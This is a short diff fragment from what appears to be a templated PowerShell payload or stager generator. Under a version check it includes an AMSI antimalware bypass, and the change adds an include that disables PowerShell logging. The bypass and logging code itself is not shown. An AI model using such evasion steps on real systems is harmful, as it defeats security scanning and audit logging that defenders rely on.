@@ -4,6 +4,7 @@ https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
 #}
 if ($PSVersionTable.PSVersion.Major -ge 5) {
     {% include "powershell/amsi/rasta-mouse.ps1" %}
+    {% include "powershell/disable-logging.ps1" %}
 }
 
 Write-Output @"
